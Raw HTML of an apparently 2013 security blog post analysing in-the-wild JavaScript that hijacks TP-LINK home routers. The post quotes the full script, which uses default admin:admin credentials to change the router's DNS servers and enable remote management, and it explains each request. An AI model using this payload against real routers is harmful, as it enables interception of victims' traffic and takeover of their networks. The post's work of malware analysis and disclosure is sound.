RAW HTML FOR: http://blog.kapravelos.com/post/68334450790/attacking-home-routers-via-javascript
<!DOCTYPE html><script>var __pbpa = true;</script><script>var translated_warning_string = 'Warning: Never enter your Tumblr password unless \u201chttps://www.tumblr.com/login\u201d\x0ais the address in your web browser.\x0a\x0aYou should also see a green \u201cTumblr, Inc.\u201d identification in the address bar.\x0a\x0aSpammers and other bad guys use fake forms to steal passwords.\x0a\x0aTumblr will never ask you to log in from a user\u2019s blog.\x0a\x0aAre you absolutely sure you want to continue?';</script><script type="text/javascript" language="javascript" src="http://assets.tumblr.com/assets/scripts/pre_tumblelog.js?_v=7f6772238e1748fa255bd191b4985d65"></script><!DOCTYPE html>
<html lang="en">
<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# blog: http://ogp.me/ns/blog#">
	<meta charset="utf-8" />
	<meta name="description" content="Attacking home routers via JavaScript We have recently noticed submissions on Wepawet that try to access local IP addresses. This is of particular interest since the attacker&rsquo;s intention is to tamper..." />
	
	<meta name="text:Twitter Username" content=""/>
	<meta name="text:Flickr Username" content=""/>
	<meta name="text:Disqus Shortname" content=""/>
	<meta name="color:Asterisk" content="#17f0ff"/>
	<meta name="if:Facebook Comments" content="0"/>
	<meta name="if:Disqus Comments" content="0"/>
	<meta name="if:Show Notes" content="1"/>
	<meta name="if:Show Asterisk" content="1"/>
	<meta name="if:Light Theme" content="0"/>
	<meta name="if:Show Portrait in Sidebar" content="0"/>
	<meta name="if:Disable Infinate Scrolling" content="0"/>
	<meta name="text:Google Analytics ID" content=""/>
	
	<title>Attacking home routers via JavaScript - Security P0wnies</title>
	<style>figure{margin:0}.tmblr-iframe{position:absolute}.tmblr-iframe.hide{display:none}</style><link rel="shortcut icon" href="http://68.media.tumblr.com/avatar_6ba154ee24bf_128.png" />
	<link rel="alternate" type="application/rss+xml" title="RSS" href="http://blog.kapravelos.com/rss"/>
	<link href="http://static.tumblr.com/xz44nnc/lgull993s/style.css" rel="stylesheet" />
	
	<script src="http://static.tumblr.com/xz44nnc/o5lkyivqw/jquery-1.3.2.min.js"></script>
	<script src="http://static.tumblr.com/xz44nnc/6eHll98ci/poop.js"></script>
	
	<script>
	$(function(){
		$('#content ol').infinitescroll({
			navSelector: "div#pagination",
			nextSelector: "a#next_page",    
			itemSelector: "#content ol li",          
			loadingImg: "http://static.tumblr.com/xz44nnc/G0Zkyivrt/loading.gif",          
			loadingText: "",      
			donetext: "We've reached the end...",
			bufferPx: 400
		});
	});
	</script>
	
	<!--[if IE]>
	<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
	<style>
        /* Source logos */
		#content .meta a img {
		    border: none;
		    background: none;
		    padding: 0;
		    margin: 0;
		    vertical-align: text-top;
		    -moz-opacity: 0.1;
		    opacity: 0.1;
		}
		
		#content .meta a:hover img {
		        -moz-opacity: 0.15;
		        opacity: 0.15;
		    }
		div.fbDarkWidget {
			border: none !important;
			background-color: none !important;
		}
		
	
	
	body.show #content ol li ol li, body.show #content ol li ul li { border: none; }
	ol#nav li.home a { color: #0c5257; }
	
	
	ol#nav { padding-top: 70px; }
	ol#nav li a#photo-nav:hover { background: none; }
	
		
		#content ol li { width: 620px; font-size: 14px; line-height: 22px; color: #999; padding: 0 0 10px 0; margin: 0 0 30px 0; }

#content blockquote p, #content blockquote a { font-size: 13px; color: #666; }

	</style>
	
    <style type="text/css">
            #content h1 { font-size: 72px; color: #808080; margin: 0 0 8px 0; letter-spacing: 0.02em; text-transform: none; }
            #content h6 { color: #AFC7C7; font-size: 16px; margin: 0 0 5px 0; line-height: 30px; }
    </style>
    
    
	
    <script type="text/javascript">
		var _gaq = _gaq || [];
		_gaq.push(['_setAccount', 'UA-29449723-1']);
		_gaq.push(['_trackPageview']);
		
		(function() {
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
		})();
	</script>
	
	
    <link rel="stylesheet" type="text/css" href="https://kapravelos.com/google-code-prettify/sunburst.css"></link>  
<script src="https://kapravelos.com/google-code-prettify/prettify.js"></script>  
<!-- Gist inclusions -->
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js"></script>
<script src="http://static.tumblr.com/fpifyru/VCxlv9xwi/writecapture.js"></script>
<script src="http://static.tumblr.com/fpifyru/AKFlv9zdu/embedgist.js"></script>


    
<link rel="alternate" href="android-app://com.tumblr/tumblr/x-callback-url/blog?blogName=kapravel%26postID=68334450790" /><link rel="alternate" href="ios-app://305343404/tumblr/x-callback-url/blog?blogName=kapravel&postID=68334450790" /><link rel="alternate" type="application/json+oembed" href="https://www.tumblr.com/oembed/1.0?url=http://blog.kapravelos.com/post/68334450790/attacking-home-routers-via-javascript" title="Attacking home routers via JavaScript
We have recently noticed submissions on Wepawet that try to access local IP addresses. This is of particular interest since the attacker&rsquo;s intention is to tamper with the configuration of the victim&rsquo;s home..."/><script src="http://assets.tumblr.com/assets/scripts/tumblelog_post_message_queue.js?_v=ae06d1ab69efc6f29297bf2b7a4160af"></script><link rel="stylesheet" type="text/css" href="http://assets.tumblr.com/fonts/gibson/stylesheet.css?v=3"><!-- BEGIN TUMBLR FACEBOOK OPENGRAPH TAGS --><!-- If you'd like to specify your own Open Graph tags, define the og:url and og:title tags in your theme's HTML. --><!-- Read more: http://ogp.me/ --><meta property="fb:app_id" content="48119224995" /><meta property="og:site_name" content="Security P0wnies" /><meta property="og:title" content="Attacking home routers via JavaScript" /><meta property="og:url" content="http://blog.kapravelos.com/post/68334450790/attacking-home-routers-via-javascript" /><meta property="og:description" content="We have recently noticed submissions on Wepawet that try to access local IP addresses. This is of particular interest since the attacker&rsquo;s intention is to tamper with the configuration of the victim&rsquo;s..." /><meta property="og:determiner" content="a" /><meta property="og:type" content="tumblr-feed:entry" /><meta property="og:image" content="http://68.media.tumblr.com/88ef9b32e1623ce4ab0bd0ccf67cd092/tumblr_inline_mwygth47BG1r3a0j2.png" /><meta property="al:ios:url" content="tumblr://x-callback-url/blog?blogName=kapravel&amp;postID=68334450790" /><meta property="al:ios:app_name" content="Tumblr" /><meta property="al:ios:app_store_id" content="305343404" /><meta property="al:android:url" content="tumblr://x-callback-url/blog?blogName=kapravel&amp;postID=68334450790" /><meta property="al:android:app_name" content="Tumblr" /><meta property="al:android:package" content="com.tumblr" /><!-- END TUMBLR FACEBOOK OPENGRAPH TAGS --><!-- GOOGLE CAROUSEL --><script type="application/ld+json">
	{"@type":"SocialMediaPosting","url":"http:\/\/blog.kapravelos.com\/post\/68334450790\/attacking-home-routers-via-javascript","mainEntityOfPage":true,"datePublished":"2013-11-28T04:34:09-05:00","author":"kapravel","image":"http:\/\/68.media.tumblr.com\/88ef9b32e1623ce4ab0bd0ccf67cd092\/tumblr_inline_mwygth47BG1r3a0j2.png","headline":"Attacking home routers via JavaScript","articleBody":"We have recently noticed submissions on Wepawet that try to access local IP addresses. This is of particular interest since the attacker\u2019s intention is to tamper with the configuration of the victim\u2019s home router.\nA live example is located at http:\/\/freemdsv.com\/ad.php?pid=20120811\nif (MSIE =...","@context":"http:\/\/schema.org"}</script><link rel="canonical" href="http://blog.kapravelos.com/post/68334450790/attacking-home-routers-via-javascript" /></head>    
<body onload="prettyPrint()">

<ol id="nav">
	<li><a id="photo-nav" href="/" title="Security P0wnies"><img src="http://68.media.tumblr.com/avatar_6ba154ee24bf_96.png"></a></li>
	
	<li><a href="/">Home</a></li>
	<li><a href="/about">About</a></li>
	
	
	
	<li><a href="http://twitter.com/kapravel">Twitter</a></li>
	<li><a href="/archive">Archive</a></li>
	<li><a href="http://blog.kapravelos.com/rss">RSS</a></li>
</ol>

<div id="content">

    <h1>Security P0wnies</h1>

    
        <h6 id="description">Blogging about security related stuff</h6>
    



	<ol>
			
		
		<li class="regular">
			<h3><a href="http://blog.kapravelos.com/post/68334450790/attacking-home-routers-via-javascript">Attacking home routers via JavaScript </a></h3>
			<p>We have recently noticed submissions on Wepawet that try to access local IP addresses. This is of particular interest since the attacker&rsquo;s intention is to tamper with the configuration of the victim&rsquo;s <strong>home router</strong>.&nbsp;</p><p>A live example is located at <a href="http://t.umblr.com/redirect?z=http%3A%2F%2Ffreemdsv.com%2Fad.php%3Fpid%3D20120811&amp;t=NzZjZjU4MGY5ZDIwOWE1YWEyOWRkNzUxNTdkY2Y0MDNhNGY3MTBiMyxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">http://freemdsv.com/ad.php?pid=20120811</a></p><pre class="prettyprint">if (MSIE = navigator.userAgent.indexOf("MSIE") == -1) {
    document.writeln("&lt;div style=\'display:none\'&gt;");

    function ip1() {
        i = new Image;
        i.src = 'http://192.168.1.1/userRpm/PPPoECfgAdvRpm.htm?wan=0&amp;lcpMru=1480&amp;ServiceName=&amp;AcName=&amp;EchoReq=0&amp;manual=2&amp;dnsserver=58.221.59.217&amp;dnsserver2=114.114.114.114&amp;downBandwidth=0&amp;upBandwidth=0&amp;Save=%B1%A3+%B4%E6&amp;Advanced=Advanced';
    }
    document.write('&lt;img src="http://admin:admin@192.168.1.1/images/logo.jpg" height=1 width=1 onload=ip1()&gt;');

    function ip3() {
        ii = new Image;
        ii.src = 'http://192.168.1.1/userRpm/ManageControlRpm.htm?port=11&amp;ip=0.0.0.0&amp;Save=%C8%B7+%B6%A8';
    }
    document.write('&lt;img src="http://admin:admin@192.168.1.1/images/logo.jpg" height=1 width=1 onload=ip3()&gt;');
    document.writeln("&lt;/div&gt;");
}
</pre><p>The script basically checks to see if the router is accessible through an image request to:</p><pre class="prettyprint lang-html"><span class="str">http://admin:admin@192.168.1.1/images/logo.jpg</span></pre><p>So it expects that the router is left in the default configuration with username/password as admin:admin and that it is accessible from the IP address 192.168.1.1. The functions <strong>ip1</strong> and <strong>ip3&nbsp;</strong>are responsible for the malicious reconfiguration of the router with the following requests:</p><pre class="prettyprint lang-html">http ://192.168.1.1/userRpm/PPPoECfgAdvRpm.htm?wan=0&amp;lcpMru=1480&amp;ServiceName=&amp;AcName=&amp;EchoReq=0&amp;manual=2&amp;dnsserver=58.221.59.217&amp;dnsserver2=114.114.114.114&amp;downBandwidth=0&amp;upBandwidth=0&amp;Save=%B1%A3+%B4%E6&amp;Advanced=Advanced
</pre><p>and</p><pre class="prettyprint lang-html"><span class="str"><code>http ://192.168.1.1/userRpm/ManageControlRpm.htm?port=11&amp;ip=0.0.0.0&amp;Save=%C8%B7+%B6%A8</code></span></pre><p>The file &ldquo;PPPoECfgAdvRpm.htm"&nbsp;seems to be the configuration of&nbsp;<span>PPPoE Advanced Settings for TP-LINK routers&nbsp;</span>(<a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwww.tp-link-support.de%2Fsoftware%2FSimulator_TL-WDR4300v1.111110%2FuserRpm%2FPPPoECfgAdvRpm.htm&amp;t=NzVjMGMwNGM3NThjZmM5YmY3YWI5Mzc0MmZjM2IwYzczZmE2OWY4OCxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">link</a>). It is very interesting that they change the victim&rsquo;s DNS servers to&nbsp;<em><strong>58.221.59.217</strong></em> and&nbsp;<strong><em>114.114.114.114</em></strong>, which means that the victim is susceptible&nbsp;to Man-in-the-middle attacks.</p><p><img src="http://68.media.tumblr.com/88ef9b32e1623ce4ab0bd0ccf67cd092/tumblr_inline_mwygth47BG1r3a0j2.png"></p><p>The second request reconfigures the router to be remotely accessible through it&rsquo;s web interface (<a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwww.tp-link-support.de%2Fsoftware%2FSimulator_TL-WDR4300v1.111110%2FuserRpm%2FManageControlRpm.htm&amp;t=ZjAxOGE4MmE5MmMwYzRiMTMwZDdkYjgyMTAwMGU4YjRmYTBhYzFhYyxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">link</a>). This way the attacker can remotely change the settings of the victim&rsquo;s router at its will.</p><p>A few reports from Wepawet that perform such attacks are here:</p><p><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwepawet.cs.ucsb.edu%2Fview.php%3Fhash%3D10d5e01e0417600883ae1c269d755664%26t%3D1382500070%26type%3Djs&amp;t=NDlmNWM2N2ZjMDNlY2NjOGFhYWFmMTBkNGRjNThhZmVlYjQ2MDRiMixkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">Wepawet report</a><br><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwepawet.cs.ucsb.edu%2Fview.php%3Fhash%3D279125f83aaee21f10aefe5287d25f48%26t%3D1361381846%26type%3Djs&amp;t=OGNhMTg1OGE3ZjU4YTc1OGM3MzllYzJjZDI2YmQ2OTA3YTM1ODZkMCxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">Wepawet report</a><br><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwepawet.cs.ucsb.edu%2Fview.php%3Fhash%3D3194142f6bdf878dcee471869451cae8%26t%3D1384140070%26type%3Djs&amp;t=NjdhNzRjZTRhMTY1NjM4ZTMxMTkwMmQ0NDU5Y2QwMGU3Yzk4OTUwYixkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">Wepawet report</a><br><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwepawet.cs.ucsb.edu%2Fview.php%3Fhash%3D383e1bf8fdcff73e7a5406fa7764b11e%26t%3D1374287715%26type%3Djs&amp;t=Yzc0NmMwMDAwYjIyNTQ2MmJjMGFhYTBjYjVkM2JmMjNhYTNkYWQxYSxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">Wepawet report</a><br><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwepawet.cs.ucsb.edu%2Fview.php%3Fhash%3D5e14985415814ed1e107c0583a27a1a2%26t%3D1384961051%26type%3Djs&amp;t=NWIzNjViZTRhODA5MTQ4YjU2OWE4ZTg2ZjFlZDM0MTAxYmQzNDMxYSxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">Wepawet report</a><br><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwepawet.cs.ucsb.edu%2Fview.php%3Fhash%3D5e14985415814ed1e107c0583a27a1a2%26t%3D1384961238%26type%3Djs&amp;t=OThhZjczNzM1ODQ0ZDFhMzNmMWY0MzgwZDMzYTIyMTc1NThlY2VkNSxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">Wepawet report</a><br><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwepawet.cs.ucsb.edu%2Fview.php%3Fhash%3D71ddeed7c094fe07a9b91f29e1d212ce%26t%3D1380963862%26type%3Djs&amp;t=MjdiNGIyYjZmZjc3MmNhMjE0MWExOTQ5MWFiZTU4ZmMxMzY0ZDg4MyxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">Wepawet report</a><br><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwepawet.cs.ucsb.edu%2Fview.php%3Fhash%3D8bb8de7cdf60d6a7589dce27a3e11ba9%26t%3D1374305102%26type%3Djs&amp;t=NjY5OTJkYTVlZGM2YTIxNDRhYTNlYzI1ZGI1YTcxYmIzNzJkZjY5ZSxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">Wepawet report</a><br><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwepawet.cs.ucsb.edu%2Fview.php%3Fhash%3Dab6ba66274172ac79b731886df4c05f0%26t%3D1385306042%26type%3Djs&amp;t=M2UwYjBmMWQ2OTI2NjdjMzZmOGY5MzExZTU0MTM0MGNiY2ZjYTFmMyxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">Wepawet report</a><br><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwepawet.cs.ucsb.edu%2Fview.php%3Fhash%3Df56123566ce4d177d5d40ff93721c645%26t%3D1381502528%26type%3Djs&amp;t=Y2I0YTUxNzQ4NTRjMWNlNmM0N2RhY2NjMDMyY2YyZDVhN2EwMGYzOSxkV1REQ3F6YQ%3D%3D&amp;b=t%3AlhX8QOSGysDGgkqCS3CspA&amp;p=http%3A%2F%2Fblog.kapravelos.com%2Fpost%2F68334450790%2Fattacking-home-routers-via-javascript&amp;m=1">Wepawet report</a></p><p>If you see any related scripts in the wild or you have information what the DNS servers are targeting feel free to contact me on twitter: <a href="http://twitter.com/intent/user?screen_name=kapravel">@kapravel</a></p>
			<p class="meta">
			    <a href="http://blog.kapravelos.com/post/68334450790/attacking-home-routers-via-javascript">3 years ago</a>
			    
			    
			    
			</p>
		</li>
		
		
		

		
		
		
		
		
		
		
		
		

		
        
        
<!-- DISQUS COMMENTS -->
<script type="text/javascript">var disqus_url = "http://blog.kapravelos.com/post/68334450790/attacking-home-routers-via-javascript"; var disqus_title ="Attacking home routers via JavaScript ";</script><div id="disqus_thread"></div>
<script type="text/javascript">
  /**
    * var disqus_identifier; [Optional but recommended: Define a unique identifier (e.g. post id or slug) for this thread] 
    */
  (function() {
   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
   dsq.src = 'http://securityp0wnies.disqus.com/embed.js';
   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript=securityp0wnies">comments powered by Disqus.</a></noscript>

<script type="text/javascript">
var disqus_shortname = 'securityp0wnies';
(function () {
  var s = document.createElement('script'); s.async = true;
  s.src = 'http://securityp0wnies.disqus.com/count.js';
  (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
}());
</script>
<!-- DISQUS COMMENTS END -->
        
        
	
	
	
	
	
	
	
	
	
	
	

	</ol>
	<div id="pagination">
		
		
	</div>
</div>

<iframe scrolling="no" width="1" height="1" frameborder="0" style="background-color:transparent; overflow:hidden; position:absolute; top:0; left:0; z-index:9999;" id="ga_target"></iframe><script type="text/javascript">
    (function(){
        var analytics_frame = document.getElementById('ga_target');
        var analytics_iframe_loaded;
        var user_logged_in;
        var blog_is_nsfw = 'No';
        var addthis_enabled = false;

        var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
        var eventer = window[eventMethod];
        var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
        eventer(messageEvent,function(e) {
            var message = (e.data && e.data.split) ? e.data.split(';') : '';
            switch (message[0]) {
                case 'analytics_iframe_loaded':
                    analytics_iframe_loaded = true;
                    postCSMessage();
                    postGAMessage();
                    postATMessage();
                    postRapidMessage();
                    break;
                case 'user_logged_in':
                    user_logged_in = message[1];
                    postGAMessage();
                    postATMessage();
                    break;
            }
        }, false);

        analytics_frame.src = "https://assets.tumblr.com/analytics.html?14fe8903b6fc4055719f823b94b746a9#" +
                              "http://blog.kapravelos.com";
        function postGAMessage() {
            if (analytics_iframe_loaded && user_logged_in) {
                var is_ajax = false;
                analytics_frame.contentWindow.postMessage(['tick_google_analytics', is_ajax, user_logged_in, blog_is_nsfw, '/post/68334450790/attacking-home-routers-via-javascript?route=%2Fpost%2F%3Aid%2F%3Asummary'].join(';'), analytics_frame.src.split('/analytics.html')[0]);
            }
        }
        function postCSMessage() {
            COMSCORE = true;
            analytics_frame.contentWindow.postMessage('enable_comscore;' + window.location, analytics_frame.src.split('/analytics.html')[0]);
        }
        function postATMessage() {
            if (addthis_enabled && analytics_iframe_loaded) {
                analytics_frame.contentWindow.postMessage('enable_addthis', analytics_frame.src.split('/analytics.html')[0]);
            }
        }
        function postRapidMessage() {
                            if (analytics_iframe_loaded) {
                    var is_ajax = '';
                    var route = '/post/:id/:summary';
                    var tumblelog_id = '35971448';
                    var yahoo_space_id = '1197719230';
                    var rapid_client_only = '1';
                    var apv = '1';
                    var rapid_ex = '';

                    analytics_frame.contentWindow.postMessage(
                        [
                            'tick_rapid', is_ajax, route, user_logged_in, tumblelog_id,
                            yahoo_space_id, rapid_client_only, apv, rapid_ex
                        ].join(';'),
                        analytics_frame.src.split('/analytics.html')[0]
                    );
                }
                    }
    })();
</script><script type="text/javascript">!function(s){s.src='https://px.srvcs.tumblr.com/impixu?T=1487271770&J=eyJ0eXBlIjoidXJsIiwidXJsIjoiaHR0cDpcL1wvYmxvZy5rYXByYXZlbG9zLmNvbVwvcG9zdFwvNjgzMzQ0NTA3OTBcL2F0dGFja2luZy1ob21lLXJvdXRlcnMtdmlhLWphdmFzY3JpcHQiLCJyZXF0eXBlIjowLCJyb3V0ZSI6IlwvcG9zdFwvOmlkXC86c3VtbWFyeSJ9&U=AIGHMKJFAG&K=e500320e0890a13cab89294e80eb2e69f3f3cde1dab4f9adb6161d772d15673a&R='.replace(/&R=[^&$]*/,'').concat('&R='+escape(document.referrer)).slice(0,2000).replace(/%.?.?$/,'');}(new Image());</script><noscript><img style="position:absolute;z-index:-3334;top:0px;left:0px;visibility:hidden;" src="https://px.srvcs.tumblr.com/impixu?T=1487271770&J=eyJ0eXBlIjoidXJsIiwidXJsIjoiaHR0cDpcL1wvYmxvZy5rYXByYXZlbG9zLmNvbVwvcG9zdFwvNjgzMzQ0NTA3OTBcL2F0dGFja2luZy1ob21lLXJvdXRlcnMtdmlhLWphdmFzY3JpcHQiLCJyZXF0eXBlIjowLCJyb3V0ZSI6IlwvcG9zdFwvOmlkXC86c3VtbWFyeSIsIm5vc2NyaXB0IjoxfQ==&U=AIGHMKJFAG&K=22f6db7f070eee3d0e0dd9eb2a44628b7fae0b017dd95e14edcac2167161eed5&R="></noscript><script >
        (function (w,d) {
            'use strict';
            var l = function(el, type, listener, useCapture) {
                el.addEventListener ?
                el.addEventListener(type, listener, !!useCapture) :
                el.attachEvent && el.attachEvent('on' + type, listener, !!useCapture);
            };
            var a = function () {
                                if (d.getElementById('tumblr-cdx')) {
                    return;
                }
                var s = d.createElement('script');
                var el = d.getElementsByTagName('script')[0];
                s.async = true;
                s.src = 'http://assets.tumblr.com/assets/scripts/vendor/cedexis/cedexis.radar.js?_v=0617a41f613fb6de733e8b614ac60762';
                s.type = 'text/javascript';
                s.id = 'tumblr-cdx';
                d.body.appendChild(s);
            };
            l(w,'load',a);
        }(window, document));
</script><script type="text/javascript">!function(s){s.src='https://px.srvcs.tumblr.com/impixu?T=1487271770&J=eyJ0eXBlIjoicG9zdCIsInVybCI6Imh0dHA6XC9cL2Jsb2cua2FwcmF2ZWxvcy5jb21cL3Bvc3RcLzY4MzM0NDUwNzkwXC9hdHRhY2tpbmctaG9tZS1yb3V0ZXJzLXZpYS1qYXZhc2NyaXB0IiwicmVxdHlwZSI6MCwicm91dGUiOiJcL3Bvc3RcLzppZFwvOnN1bW1hcnkiLCJwb3N0cyI6W3sicG9zdGlkIjoiNjgzMzQ0NTA3OTAiLCJibG9naWQiOiIzNTk3MTQ0OCIsInNvdXJjZSI6MzN9XX0=&U=COOOOEADJL&K=60a85126c1955a4449aeb13e0c34370be35fcf856a7c00637361dc8f8c53fb4d&R='.replace(/&R=[^&$]*/,'').concat('&R='+escape(document.referrer)).slice(0,2000).replace(/%.?.?$/,'');}(new Image());</script><noscript><img style="position:absolute;z-index:-3334;top:0px;left:0px;visibility:hidden;" src="https://px.srvcs.tumblr.com/impixu?T=1487271770&J=eyJ0eXBlIjoicG9zdCIsInVybCI6Imh0dHA6XC9cL2Jsb2cua2FwcmF2ZWxvcy5jb21cL3Bvc3RcLzY4MzM0NDUwNzkwXC9hdHRhY2tpbmctaG9tZS1yb3V0ZXJzLXZpYS1qYXZhc2NyaXB0IiwicmVxdHlwZSI6MCwicm91dGUiOiJcL3Bvc3RcLzppZFwvOnN1bW1hcnkiLCJwb3N0cyI6W3sicG9zdGlkIjoiNjgzMzQ0NTA3OTAiLCJibG9naWQiOiIzNTk3MTQ0OCIsInNvdXJjZSI6MzN9XSwibm9zY3JpcHQiOjF9&U=COOOOEADJL&K=a2ce8723a4a8630c46d17abab1038c8b5bfa461638ce7a4df50f8199470b2236&R="></noscript><noscript id="bootloader" data-bootstrap="{&quot;Components&quot;:{&quot;PostActivity&quot;:[],&quot;TumblelogIframe&quot;:{&quot;unified&quot;:false,&quot;variant&quot;:null,&quot;isCompact&quot;:false,&quot;tumblelogBundleSrc&quot;:&quot;http:\/\/assets.tumblr.com\/client\/prod\/standalone\/tumblelog\/index.build.js?_v=0b1ff7c0518d68fb0be44bebb35677db&quot;,&quot;tumblelogName&quot;:&quot;kapravel&quot;,&quot;isLoggedIn&quot;:false,&quot;isFriend&quot;:false,&quot;formKey&quot;:&quot;&quot;,&quot;canSubscribe&quot;:false,&quot;isSubscribed&quot;:false,&quot;tumblelogTitle&quot;:&quot;Security P0wnies&quot;,&quot;tumblelogAvatar&quot;:&quot;http:\/\/68.media.tumblr.com\/avatar_6ba154ee24bf_40.png&quot;,&quot;tumblelogHost&quot;:&quot;http:\/\/blog.kapravelos.com&quot;,&quot;isOptica&quot;:false,&quot;isCustomTheme&quot;:true,&quot;themeHeaderImage&quot;:&quot;https:\/\/assets.tumblr.com\/images\/default_header\/optica_pattern_03.png?_v=a0f20b51ed40eb5a930ab86effe42a40&quot;,&quot;themeBackgroundColor&quot;:&quot;#FAFAFA&quot;,&quot;themeTitleColor&quot;:&quot;#444444&quot;,&quot;themeAccentColor&quot;:&quot;#529ECC&quot;,&quot;brag&quot;:true,&quot;adsEnabled&quot;:true,&quot;canShowAd&quot;:false,&quot;isPremium&quot;:null,&quot;showLrecAds&quot;:false,&quot;showStickyLrecBackfill&quot;:true,&quot;showGeminiAds&quot;:false,&quot;geminiSectionCodeDesktop&quot;:&quot;a10bca9c-0c5d-4a02-ab13-14ab8513d81d&quot;,&quot;geminiSectionCodeMobile&quot;:&quot;ced63809-b609-4aca-96a0-abc099acba6b&quot;,&quot;currentPageType&quot;:&quot;single_post&quot;,&quot;currentPage&quot;:&quot;1&quot;,&quot;searchQuery&quot;:&quot;&quot;,&quot;tag&quot;:&quot;&quot;,&quot;query&quot;:&quot;&quot;,&quot;chrono&quot;:false,&quot;postId&quot;:&quot;68334450790&quot;,&quot;src&quot;:&quot;http:\/\/blog.kapravelos.com\/post\/68334450790\/attacking-home-routers-via-javascript&quot;,&quot;postUrl&quot;:&quot;&quot;,&quot;isBlocked&quot;:null,&quot;isAdmin&quot;:false,&quot;lookupButtonUrl&quot;:&quot;&quot;,&quot;showSpamButton&quot;:false,&quot;showRootPostButton&quot;:false,&quot;rootPostUrl&quot;:&quot;&quot;,&quot;showRadarPostButton&quot;:false,&quot;radarKeys&quot;:&quot;&quot;,&quot;isUniblocked&quot;:false,&quot;isNsfw&quot;:false,&quot;isAdult&quot;:false,&quot;isSpam&quot;:false,&quot;isPrimaryBlog&quot;:false,&quot;canEdit&quot;:false,&quot;canReblogSelf&quot;:false,&quot;showLikeButton&quot;:false,&quot;showReblogButton&quot;:false,&quot;reblogUrl&quot;:&quot;&quot;,&quot;showFanMailButton&quot;:false,&quot;showMessagingButton&quot;:false,&quot;loginCheckIframeSrc&quot;:&quot;http:\/\/assets.tumblr.com\/assets\/html\/iframe\/login_check.html?_v=db0fd3d8bbf41992f1bb20296cc8b4a8&quot;,&quot;appInstallUrl&quot;:&quot;https:\/\/go.onelink.me\/893408789?pid=tumblr_blog_network\u0026c=tumblr_blog_network\u0026af_sub3=blog_name&quot;,&quot;appOpenReferrer&quot;:&quot;mobile_banner&quot;,&quot;isShowSearch&quot;:true}},&quot;Flags&quot;:{&quot;doods&quot;:&quot;eyJmaWx0ZXJfbnNmdyI6dHJ1ZSwia2V5Y29tbWFuZF9hdXRvX3BhZ2luYXRlIjp0cnVlLCJsb2dnZWRfb3V0X3NlYXJjaCI6dHJ1ZSwiYXJjaGl2ZS1wbHVzIjp0cnVlLCJzZWN1cmVfZm9ybV9rZXkiOnRydWUsInNlY3